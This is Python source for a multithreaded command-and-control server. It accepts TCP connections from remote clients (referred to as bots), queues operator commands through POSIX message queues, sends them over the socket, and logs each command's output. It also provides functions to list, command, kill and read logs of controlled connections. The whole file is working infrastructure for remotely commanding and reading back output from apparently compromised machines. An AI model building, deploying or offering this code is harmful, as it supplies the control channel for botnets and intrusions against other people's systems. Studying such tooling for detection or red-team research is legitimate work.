import socketserver
import socket
import uuid
import os
import time
import json
import threading
import posix_ipc
from c2.connection import init_connection, init_cmd_uuid_to_index_mapping


base_dir = '/usr/src/app/c2/connections/'
hello_log = '/hello_log'
lock_name = '/connections_lock'
cmd_metadata_separator = '----'
semaphore_timeout = 30


class InvalidConnUUID(Exception):
    pass


class NotAliveConnection(Exception):
    pass


class InvalidSyncOperation(Exception):
    pass


class ConnectionStorage:
    def __init__(self):
        self.connections = {}
        self.reload()
        self.semaphore = None

    @staticmethod
    def must_acquire_after_timeout(semaphore: posix_ipc.Semaphore):
        try:
            semaphore.acquire(timeout=semaphore_timeout)
        except posix_ipc.BusyError:
            # maybe another thread crashed for some reason
            semaphore.release()
            # optimistically, now it should enter
            semaphore.acquire()

    def reload(self):
        # semaphore is also necessary here, to ensure the JSON is in a consistent state when read
        semaphore = posix_ipc.Semaphore(lock_name, flags=posix_ipc.O_CREAT, initial_value=1)
        ConnectionStorage.must_acquire_after_timeout(semaphore)
        with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
            self.connections = json.load(f)
        semaphore.release()

    def start_sync(self):
        self.semaphore = posix_ipc.Semaphore(lock_name, flags=posix_ipc.O_CREAT, initial_value=1)
        ConnectionStorage.must_acquire_after_timeout(self.semaphore)
        with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
            saved_connections = json.load(f)
        self.connections.update(saved_connections)

    def end_sync(self):
        if self.semaphore is None:
            raise InvalidSyncOperation
        with open(os.path.join(base_dir, 'connections.json'), 'w') as f:
            json.dump(self.connections, f, default=str)
        self.semaphore.release()
        self.semaphore = None


class C2TCPHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        connectionStorage = ConnectionStorage()
        conn_uuid = uuid.uuid4().hex
        conn_folder = base_dir + conn_uuid
        os.mkdir(conn_folder)
        try:
            mq = posix_ipc.MessageQueue(f'/{conn_uuid}', flags=posix_ipc.O_CREAT)
        except OSError:
            connectionStorage.start_sync()
            connectionStorage.connections[conn_uuid] = init_connection(time.time(), self.client_address)
            connectionStorage.connections[conn_uuid]['is_alive'] = False
            connectionStorage.end_sync()
            log_file = conn_folder + hello_log
            log_handler = open(log_file, 'wb')
            log_handler.write(b"[*] Connection closed for OS error: too many message queues\n")
            log_handler.close()
            self.request.sendall(b'close\n')
            return
        connectionStorage.start_sync()
        connectionStorage.connections[conn_uuid] = init_connection(time.time(), self.client_address)
        connectionStorage.end_sync()
        log_file = conn_folder + hello_log
        # TODO: what to expect here as "hello", in general?
        hello = self.request.recv(6).strip()
        log_handler = open(log_file, 'wb')
        log_handler.write(hello)
        log_handler.close()
        close = False
        while not close:
            command = mq.receive()[0].split(cmd_metadata_separator.encode())
            cmd_uuid, command = command[0].decode(), command[1]
            connectionStorage.start_sync()
            connectionStorage.connections[conn_uuid]['pending_cmd'] = True
            connectionStorage.connections[conn_uuid]['cmd_uuid_to_index'][cmd_uuid] = \
                init_cmd_uuid_to_index_mapping(connectionStorage.connections[conn_uuid]["num_commands"])
            connectionStorage.end_sync()
            # handling the case in which newline is not needed with MTU
            if len(command) < 1460:
                self.request.sendall(command + b'\n')
            else:
                self.request.sendall(command)
            log_file = conn_folder + f'/command_{connectionStorage.connections[conn_uuid]["num_commands"]}'
            log_handler = open(log_file, 'wb')
            log_handler.write(command + b'\n')
            # force write of command to created file, before completing the command
            log_handler.close()
            log_handler = open(log_file, 'ab')
            if b'close' in command:
                close = True
                mq.close()
            else:
                n_received, receiving = 0, True
                original_timeout = self.request.gettimeout()
                while receiving:
                    try:
                        # wait a second that more data is available
                        time.sleep(1)
                        data = self.request.recv(4096)
                        log_handler.write(data)
                        connectionStorage.start_sync()
                        connectionStorage.connections[conn_uuid]['last_seen'] = time.time()
                        connectionStorage.end_sync()
                        n_received += 1
                        # decrease timeout for the next receives
                        self.request.settimeout(2)
                    except (TimeoutError, socket.timeout):
                        if n_received == 0:
                            data = b"\n[*] Connection closed for timeout error\n"
                            log_handler.write(data)
                            close = True
                        else:
                            self.request.settimeout(original_timeout)
                        receiving = False
            log_handler.close()
            connectionStorage.start_sync()
            connectionStorage.connections[conn_uuid]['pending_cmd'] = False
            connectionStorage.connections[conn_uuid]['cmd_uuid_to_index'][cmd_uuid]['pending'] = False
            connectionStorage.connections[conn_uuid]['num_commands'] += 1
            if not connectionStorage.connections[conn_uuid]['is_alive']:
                close = True
            connectionStorage.end_sync()
        connectionStorage.start_sync()
        connectionStorage.connections[conn_uuid]['is_alive'] = False
        connectionStorage.end_sync()


def start_multithreaded_c2(config):
    with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
        connections = json.load(f)
    # if the C2 handler of a connection crashes, it may incorrectly result that the saved connection is alive
    for conn_uuid in connections:
        connections[conn_uuid]['is_alive'] = False
    with open(os.path.join(base_dir, 'connections.json'), 'w') as f:
        json.dump(connections, f, default=str)
    host, port = '0.0.0.0', config['c2_port']
    server = socketserver.ThreadingTCPServer((host, port), C2TCPHandler)
    server.timeout = config['c2_bot_timeout']
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.start()
    return server


def kill_c2_connection(conn_uuid):
    connectionStorage = ConnectionStorage()
    # the send_c2_command also performs sanity checks
    send_c2_command(conn_uuid, 'close')
    connectionStorage.start_sync()
    connectionStorage.connections[conn_uuid]['is_alive'] = False
    connectionStorage.end_sync()


def list_c2_connections():
    connectionStorage = ConnectionStorage()
    connections = connectionStorage.connections
    conn_tuples = []
    for conn_uuid in connections:
        client_addr = connections[conn_uuid]['client_addr']
        last_seen = connections[conn_uuid]['last_seen']
        is_alive = connections[conn_uuid]['is_alive']
        num_commands = connections[conn_uuid]['num_commands']
        conn_tuples.append((conn_uuid, client_addr, last_seen, is_alive, num_commands))
    return conn_tuples


def send_c2_command(conn_uuid, command):
    connectionStorage = ConnectionStorage()
    connections = connectionStorage.connections
    if conn_uuid not in connections:
        raise InvalidConnUUID
    if not connections[conn_uuid]['is_alive']:
        raise NotAliveConnection
    cmd_uuid = uuid.uuid4().hex
    if isinstance(command, bytes):
        command = cmd_uuid.encode() + cmd_metadata_separator.encode() + command
    else:
        command = f"{cmd_uuid}{cmd_metadata_separator}{command}"
    mq_name = f'/{conn_uuid}'
    try:
        mq = posix_ipc.MessageQueue(mq_name)
        mq.send(command)
    except posix_ipc.Error:
        raise NotAliveConnection
    return cmd_uuid


def read_c2_log(conn_uuid, index=None, decode=True):
    connectionStorage = ConnectionStorage()
    connections = connectionStorage.connections
    if conn_uuid not in connections:
        raise InvalidConnUUID
    if index is None:
        conn_folder = base_dir + conn_uuid
        log_file = conn_folder + hello_log
        with open(log_file, 'rb') as f:
            data = f.read()
    else:
        try:
            index = int(index)
            if index < 0:
                return "Index must be positive"
            if index >= connections[conn_uuid]['num_commands']:
                return "Index must be less than the number of completed commands"
            conn_folder = base_dir + conn_uuid
            log_file = conn_folder + f'/command_{index}'
            with open(log_file, 'rb') as f:
                data = f.read()
        except ValueError:
            return "Invalid index"
    if decode:
        data = data.decode(errors='replace')
    return data
